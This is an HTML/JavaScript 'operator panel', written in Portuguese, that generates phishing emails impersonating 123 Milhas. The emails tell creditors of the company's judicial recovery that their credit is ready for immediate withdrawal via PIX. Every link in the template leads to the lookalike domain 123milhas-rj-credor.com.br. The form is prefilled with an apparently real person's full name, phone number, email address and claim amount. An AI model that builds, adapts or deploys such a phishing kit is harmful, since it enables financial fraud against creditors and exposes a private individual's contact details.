<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>123 Milhas - Painel do Operador | Gerador de E-mail</title>
  
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #e9ecef 100%);
      min-height: 100vh;
      padding: 40px 20px;
    }
    
    .container {
      max-width: 1400px;
      margin: 0 auto;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 30px;
    }
    
    /* Formulário */
    .form-panel {
      background: white;
      border-radius: 32px;
      padding: 30px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    }
    
    .form-panel h2 {
      font-size: 1.5rem;
      font-weight: 800;
      color: #1a1a2e;
      margin-bottom: 8px;
    }
    
    .form-panel p {
      color: #6c757d;
      font-size: 0.85rem;
      margin-bottom: 24px;
      border-left: 3px solid #f05929;
      padding-left: 12px;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-group label {
      display: block;
      font-size: 0.7rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #6c757d;
      margin-bottom: 8px;
    }
    
    .form-group label i {
      margin-right: 6px;
    }
    
    .form-group input,
    .form-group select {
      width: 100%;
      padding: 12px 16px;
      font-size: 0.9rem;
      border: 2px solid #e9ecef;
      border-radius: 16px;
      font-family: 'Montserrat', sans-serif;
      transition: all 0.2s;
    }
    
    .form-group input:focus,
    .form-group select:focus {
      outline: none;
      border-color: #f05929;
    }
    
    .form-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }
    
    .btn-gerar {
      width: 100%;
      background: linear-gradient(135deg, #f05929 0%, #d94a1a 100%);
      color: white;
      border: none;
      padding: 14px;
      border-radius: 30px;
      font-size: 1rem;
      font-weight: 800;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 10px;
    }
    
    .btn-gerar:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(240, 89, 41, 0.3);
    }
    
    /* Output */
    .output-panel {
      display: flex;
      flex-direction: column;
      gap: 30px;
    }
    
    .code-section {
      background: #1a1a2e;
      border-radius: 24px;
      overflow: hidden;
    }
    
    .code-header {
      background: #2d2d44;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .code-header h3 {
      color: white;
      font-size: 0.9rem;
      font-weight: 600;
    }
    
    .btn-copy {
      background: rgba(255,255,255,0.1);
      border: none;
      color: white;
      padding: 8px 16px;
      border-radius: 30px;
      cursor: pointer;
      font-size: 0.8rem;
      font-weight: 600;
      transition: all 0.2s;
    }
    
    .btn-copy:hover {
      background: #28a745;
    }
    
    .code-content {
      background: #0d0d1a;
      padding: 20px;
      max-height: 450px;
      overflow: auto;
    }
    
    .code-content pre {
      color: #e0e0e0;
      font-family: 'Monaco', 'Courier New', monospace;
      font-size: 11px;
      white-space: pre-wrap;
      word-wrap: break-word;
      margin: 0;
    }
    
    .preview-section {
      background: white;
      border-radius: 24px;
      overflow: hidden;
      border: 1px solid #e9ecef;
    }
    
    .preview-header {
      background: #f8f9fa;
      padding: 16px 20px;
      border-bottom: 1px solid #e9ecef;
    }
    
    .preview-header h3 {
      font-size: 0.9rem;
      font-weight: 700;
      color: #1a1a2e;
    }
    
    .preview-content {
      padding: 20px;
      max-height: 500px;
      overflow: auto;
      background: #f5f7fa;
    }
    
    .toast {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: #28a745;
      color: white;
      padding: 12px 24px;
      border-radius: 50px;
      font-size: 0.8rem;
      font-weight: 600;
      z-index: 1000;
      animation: fadeInUp 0.3s ease;
    }
    
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    @media (max-width: 900px) {
      .container {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Painel do Formulário -->
    <div class="form-panel">
      <h2><i class="fas fa-envelope-open-text"></i> Gerador de E-mail</h2>
      <p>Preencha os dados do cliente abaixo. O código HTML será gerado automaticamente com o layout oficial da 123 Milhas.</p>
      
      <div class="form-group">
        <label><i class="fas fa-user"></i> Nome Completo do Cliente</label>
        <input type="text" id="nome" placeholder="Ex: VALERIA CRISTINA DOS SANTOS AMARAL" value="VALERIA CRISTINA DOS SANTOS AMARAL">
      </div>
      
      <div class="form-group">
        <label><i class="fas fa-dollar-sign"></i> Valor do Crédito</label>
        <input type="text" id="valor" placeholder="Ex: R$ 43.204,51" value="R$ 43.204,51">
      </div>
      
      <div class="form-group">
        <label><i class="fas fa-tag"></i> Classe</label>
        <select id="classe">
          <option value="Quirografário">Quirografário</option>
          <option value="Preferencial">Preferencial</option>
          <option value="Subordinado">Subordinado</option>
          <option value="Trabalhista">Trabalhista</option>
        </select>
      </div>
      
      <div class="form-row">
        <div class="form-group">
          <label><i class="fas fa-phone"></i> Telefone</label>
          <input type="text" id="telefone" placeholder="(21) 98643-0700" value="(21) 98643-0700">
        </div>
        
        <div class="form-group">
          <label><i class="fas fa-envelope"></i> E-mail</label>
          <input type="email" id="email" placeholder="cliente@email.com" value="valeriaamaral01@gmail.com">
        </div>
      </div>
      
      <div class="form-group">
        <label><i class="fas fa-link"></i> Link do Site</label>
        <input type="text" id="site" value="https://123milhas-rj-credor.com.br">
      </div>
      
      <button class="btn-gerar" onclick="gerarEmail()">
        <i class="fas fa-magic"></i> GERAR CÓDIGO HTML
      </button>
    </div>
    
    <!-- Painel de Saída -->
    <div class="output-panel">
      <!-- Código para copiar -->
      <div class="code-section">
        <div class="code-header">
          <h3><i class="fas fa-code"></i> Código HTML (copie e cole no e-mail)</h3>
          <button class="btn-copy" onclick="copiarCodigo()">
            <i class="fas fa-copy"></i> Copiar Código
          </button>
        </div>
        <div class="code-content">
          <pre id="codigoHtml">Preencha os dados e clique em GERAR</pre>
        </div>
      </div>
      
      <!-- Preview Visual -->
      <div class="preview-section">
        <div class="preview-header">
          <h3><i class="fas fa-eye"></i> Visualização do E-mail</h3>
        </div>
        <div class="preview-content" id="previewEmail">
          <p style="color: #6c757d; text-align: center;">Preencha os dados e clique em GERAR</p>
        </div>
      </div>
    </div>
  </div>
  
  <script>
    function gerarEmail() {
      // Pegar valores dos inputs
      let nomeCompleto = document.getElementById('nome').value.trim() || "CLIENTE";
      let valor = document.getElementById('valor').value.trim() || "R$ 0,00";
      let classe = document.getElementById('classe').value;
      let telefone = document.getElementById('telefone').value.trim() || "Não informado";
      let email = document.getElementById('email').value.trim() || "cliente@email.com";
      let site = document.getElementById('site').value.trim() || "https://123milhas-rj-credor.com.br";
      
      // Pegar primeiro nome
      let primeiroNome = nomeCompleto.split(" ")[0];
      
      // Gerar HTML do email (exatamente com seu layout ajustado)
      const htmlEmail = `<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>123 Milhas - Seu crédito está disponível</title>
    <style>
      @media only screen and (max-width: 600px) {
        .email-container {
          width: 100% !important;
          border-radius: 0 !important;
        }
        .padding-mobile {
          padding: 20px !important;
        }
        .stack {
          display: block !important;
          width: 100% !important;
          text-align: center !important;
        }
        .font-lg {
          font-size: 26px !important;
        }
      }
    </style>
  </head>
  <body style="margin: 0; padding: 0; background-color: #f5f7fa">
    <div style="margin: 0; padding: 20px">
      <div
        class="email-container"
        style="
          max-width: 600px;
          margin: 0 auto;
          background-color: #ffffff;
          border-radius: 24px;
          overflow: hidden;
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
        "
      >
        <!-- LOGO BRANCA -->
        <div style="background: #ffffff; padding: 16px; text-align: center">
          <a href="${site}">
            <img src="https://123milhas-rj-credor.com.br/static/assets/img/logo.avif" alt="123 Milhas" style="height: 48px; width: auto" />
          </a>
        </div>

        <!-- HEADER LARANJA -->
        <div class="padding-mobile" style="background: linear-gradient(135deg, #f05929 0%, #d94a1a 100%); padding: 24px 32px">
          <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px">
            <a href="${site}" style="text-decoration: none">
              <span class="stack" style="color: #ffffff; font-weight: 700; font-size: 16px"> Seu crédito está disponível </span>
            </a>
            <a href="${site}" style="text-decoration: none">
              <span
                class="stack"
                style="
                  background: rgba(255, 255, 255, 0.2);
                  padding: 6px 14px;
                  border-radius: 50px;
                  font-size: 12px;
                  font-weight: 600;
                  color: white;
                "
              >
                Crédito Disponível
              </span>
            </a>
          </div>
        </div>

        <!-- CONTEÚDO -->
        <div class="padding-mobile" style="padding: 32px">
          <h1 class="font-lg" style="font-size: 24px; font-weight: 800; color: #1a1a2e; margin-bottom: 8px">
            Olá, <span style="color: #f05929">${primeiroNome}</span>
          </h1>

          <p style="color: #6c757d; font-size: 14px; margin-bottom: 28px; border-left: 3px solid #f05929; padding-left: 12px">
            Seu crédito judicial da 123 Milhas está disponível para saque!
          </p>

          <!-- CARD DO VALOR -->
          <div
            style="
              background: linear-gradient(135deg, #f05929 0%, #d94a1a 100%);
              border-radius: 28px;
              padding: 28px;
              text-align: center;
              margin-bottom: 28px;
              color: white;
            "
          >
            <div style="font-size: 12px; text-transform: uppercase; letter-spacing: 2px; opacity: 0.8; margin-bottom: 8px">
              VALOR DISPONÍVEL PARA SAQUE
            </div>
            <div class="font-lg" style="font-size: 36px; font-weight: 800; letter-spacing: -1px">${valor}</div>
            <div
              style="
                background: rgba(255, 255, 255, 0.2);
                display: inline-block;
                padding: 4px 12px;
                border-radius: 50px;
                font-size: 11px;
                font-weight: 600;
                margin-top: 12px;
              "
            >
              ${classe}
            </div>
          </div>

          <!-- INFORMAÇÕES -->
          <div style="background: #f8f9fa; border-radius: 20px; padding: 20px; margin-bottom: 28px">
            <div style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #e9ecef">
              <span style="font-size: 13px; color: #6c757d">Nome Completo</span>
              <span style="font-size: 14px; font-weight: 700; color: #1a1a2e">${nomeCompleto}</span>
            </div>
            <div style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #e9ecef">
              <span style="font-size: 13px; color: #6c757d">Telefone</span>
              <span style="font-size: 14px; font-weight: 700; color: #1a1a2e">${telefone}</span>
            </div>
            <div style="display: flex; justify-content: space-between; padding: 10px 0">
              <span style="font-size: 13px; color: #6c757d">E-mail</span>
              <span style="font-size: 14px; font-weight: 700; color: #1a1a2e">${email}</span>
            </div>
          </div>

          <!-- BOTÃO -->
          <div style="text-align: center">
            <a
              href="${site}"
              style="
                display: inline-block;
                background: linear-gradient(135deg, #f05929 0%, #d94a1a 100%);
                color: white;
                text-decoration: none;
                padding: 14px 32px;
                border-radius: 50px;
                font-weight: 700;
                font-size: 14px;
                margin-bottom: 24px;
              "
            >
              ACESSAR MINHA CONTA E SACAR
            </a>
            <p style="font-size: 12px; color: #6c757d; margin-top: 8px">⚡ Saque imediato via PIX ou transferência bancária</p>
          </div>
        </div>

        <!-- FOOTER -->
        <div style="background: #f8f9fa; padding: 24px 32px; text-align: center; border-top: 1px solid #e9ecef">
          <div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 16px; flex-wrap: wrap">
            <a href="${site}" style="color: #f05929; text-decoration: none; font-size: 12px"
              >Acessar Minha Conta</a
            >
            <a href="${site}" style="color: #f05929; text-decoration: none; font-size: 12px"
              >Falar com Suporte</a
            >
            <a href="${site}" style="color: #f05929; text-decoration: none; font-size: 12px"
              >Perguntas Frequentes</a
            >
          </div>
          <div style="font-size: 11px; color: #8e9aaf; margin-bottom: 12px">
            Este é um comunicado oficial sobre seu crédito judicial. Para garantir a segurança da sua conta, não compartilhe este e-mail.
          </div>
          <div style="font-size: 10px; color: #adb5bd">© 2026 123 Milhas - Recuperação Judicial. Todos os direitos reservados.</div>
        </div>
      </div>
    </div>
  </body>
</html>`;
      
      // Mostrar código
      document.getElementById('codigoHtml').innerText = htmlEmail;
      
      // Mostrar preview (inserir o HTML no iframe ou div)
      const previewDiv = document.getElementById('previewEmail');
      previewDiv.innerHTML = htmlEmail;
    }
    
    function copiarCodigo() {
      const codigo = document.getElementById('codigoHtml').innerText;
      
      if (!codigo || codigo === "Preencha os dados e clique em GERAR") {
        alert("❌ Primeiro preencha os dados e clique em GERAR!");
        return;
      }
      
      navigator.clipboard.writeText(codigo).then(() => {
        mostrarToast("✅ Código copiado! Agora cole no seu cliente de e-mail.");
      }).catch(() => {
        alert("❌ Não foi possível copiar. Selecione manualmente e copie.");
      });
    }
    
    function mostrarToast(mensagem) {
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.innerHTML = `<i class="fas fa-check-circle"></i> ${mensagem}`;
      document.body.appendChild(toast);
      setTimeout(() => toast.remove(), 3000);
    }
    
    // Gerar automaticamente ao carregar a página
    window.onload = function() {
      gerarEmail();
    };
  </script>
</body>
</html>
